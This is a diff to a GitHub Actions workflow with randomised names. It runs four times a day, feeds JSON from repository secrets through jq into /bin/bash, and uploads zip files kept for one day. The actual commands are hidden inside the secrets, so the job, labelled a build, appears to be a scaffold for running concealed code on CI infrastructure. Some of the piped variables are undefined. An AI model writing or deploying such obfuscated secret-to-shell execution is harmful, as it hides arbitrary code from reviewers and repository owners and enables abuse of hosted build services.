@@ -1,26 +1,25 @@
 name: csharpcharles42
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '29 5/6 * * *'
 
+  schedule:
+    - cron: '27 1,7,13,19 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: csharpcharles42
         env:
-          rp5: ${{ secrets.rp5 }}
+          fhw06: ${{ secrets.fhw06 }}
         run: |
-          echo $rp5 | jq -r .eyt2324 | /bin/bash
-          echo $n802 | jq -r .ermzi869 | /bin/bash
-          echo $simj27 | jq -r .x2775 | /bin/bash
-          echo $n0 | jq -r .hz6 | /bin/bash
-          echo $goz346 | jq -r .y98308 | /bin/bash
-          echo $umbnd5897 | jq -r .rh461 | /bin/bash
-          echo $gus2 | jq -r .fwke8154 | /bin/bash
-          echo $qobly09760 | jq -r .htzog4 | /bin/bash
-          echo $x750 | jq -r .ng1 | /bin/bash
+          printf '%s' "$fhw06" | jq -r .fj6860 | /bin/bash
+          printf '%s' "$obms43" | jq -r .biwgr02229 | /bin/bash
+          printf '%s' "$fuoio9" | jq -r .xc970 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: VbkkiafX
+          path: "*.zip"
+          retention-days: 1
